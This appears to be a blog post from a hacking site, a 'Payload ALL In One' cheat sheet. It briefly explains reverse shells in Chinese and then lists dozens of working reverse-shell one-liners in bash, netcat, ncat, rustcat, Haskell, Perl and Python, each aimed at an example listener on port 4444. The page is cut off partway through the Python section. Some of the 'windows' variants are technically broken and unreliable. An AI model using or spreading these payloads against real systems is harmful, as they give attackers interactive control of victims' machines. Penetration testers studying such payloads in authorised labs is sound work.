<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Payload ALL In One | HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Reverse shell 一種網路通信，其中建立從遠端主機（「攻擊者」）到目標主機（「受害者」）的連接 攻擊者能夠在受害者的電腦上執行命令，就好像他們在受害者的電腦上執行指令一樣 透過利用受害者系統中的漏洞或誘騙受害者來運行建立 reverse shell 的惡意程式完成   example IP: 127.0.0.1example Port: 4444 For Linux&#x2F;MAC B">
<meta property="og:type" content="article">
<meta property="og:title" content="Payload ALL In One">
<meta property="og:url" content="https://no-flag.com/2024/12/21/payload/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Reverse shell 一種網路通信，其中建立從遠端主機（「攻擊者」）到目標主機（「受害者」）的連接 攻擊者能夠在受害者的電腦上執行命令，就好像他們在受害者的電腦上執行指令一樣 透過利用受害者系統中的漏洞或誘騙受害者來運行建立 reverse shell 的惡意程式完成   example IP: 127.0.0.1example Port: 4444 For Linux&#x2F;MAC B">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-12-21T12:32:07.090Z">
<meta property="article:modified_time" content="2024-04-03T17:43:08.357Z">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-payload" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/payload/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.090Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Payload ALL In One
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><ul>
<li>一種網路通信，其中建立從遠端主機（「攻擊者」）到目標主機（「受害者」）的連接</li>
<li>攻擊者能夠在受害者的電腦上執行命令，就好像他們在受害者的電腦上執行指令一樣</li>
<li>透過利用受害者系統中的漏洞或誘騙受害者來運行建立 reverse shell 的惡意程式完成</li>
</ul>
<hr>
<p>example IP: 127.0.0.1<br>example Port: 4444</p>
<h3 id="For-Linux-MAC"><a href="#For-Linux-MAC" class="headerlink" title="For Linux&#x2F;MAC"></a>For Linux&#x2F;MAC</h3><ul>
<li>Bash -i</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- powershell -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- pwsh -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash 196</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; /bin/sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; cmd &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; powershell &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line">- 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; pwsh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash read line</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- exec 5&lt;&gt;/dev/tcp/127.0.0.1/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash 5</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- /bin/sh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- /bin/bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- powershell -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line">- pwsh -i 5&lt;&gt; /dev/tcp/127.0.0.1/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash udp</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- sh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/sh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- bash -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- /bin/bash -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- cmd -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- powershell -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">- pwsh -i &gt;&amp; /dev/udp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nc mkfifo</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|pwsh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nc -e</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc 127.0.0.1 4444 -e sh</span><br><span class="line">- nc 127.0.0.1 4444 -e /bin/sh</span><br><span class="line">- nc 127.0.0.1 4444 -e bash</span><br><span class="line">- nc 127.0.0.1 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc 127.0.0.1 4444 -e cmd</span><br><span class="line">- nc 127.0.0.1 4444 -e powershell</span><br><span class="line">- nc 127.0.0.1 4444 -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nc -c</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc -c sh 127.0.0.1 4444</span><br><span class="line">- nc -c /bin/sh 127.0.0.1 4444</span><br><span class="line">- nc -c bash 127.0.0.1 4444</span><br><span class="line">- nc -c /bin/bash 127.0.0.1 4444</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc -c cmd 127.0.0.1 4444</span><br><span class="line">- nc -c powershell 127.0.0.1 4444</span><br><span class="line">- nc -c pwsh 127.0.0.1 4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>ncat -e</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- ncat 127.0.0.1 4444 -e sh</span><br><span class="line">- ncat 127.0.0.1 4444 -e /bin/sh</span><br><span class="line">- ncat 127.0.0.1 4444 -e bash</span><br><span class="line">- ncat 127.0.0.1 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- ncat 127.0.0.1 4444 -e cmd</span><br><span class="line">- ncat 127.0.0.1 4444 -e powershell</span><br><span class="line">- ncat 127.0.0.1 4444 -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>ncat udp</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|powershell -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line">- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|pwsh -i 2&gt;&amp;1|ncat -u 127.0.0.1 4444 &gt;/tmp/f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>rustcat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- rcat 127.0.0.1 4444 -r sh</span><br><span class="line">- rcat 127.0.0.1 4444 -r /bin/sh</span><br><span class="line">- rcat 127.0.0.1 4444 -r bash</span><br><span class="line">- rcat 127.0.0.1 4444 -r /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- rcat 127.0.0.1 4444 -r cmd</span><br><span class="line">- rcat 127.0.0.1 4444 -r powershell</span><br><span class="line">- rcat 127.0.0.1 4444 -r pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Haskell #1</li>
</ul>
<p>	</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">module Main where</span><br><span class="line"></span><br><span class="line">import System.Process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面這一條有不同使用方式，根據自身環境選擇其中一條 `main=...` 使用</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux/mac</span></span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows</span></span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | cmd -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | powershell -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line">- main = callCommand &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | pwsh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt;/tmp/f&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Perl</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;cmd -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;powershell -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;pwsh -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Perl no sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line">- perl -e &#x27;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Python</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python2</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python3</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python2</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span 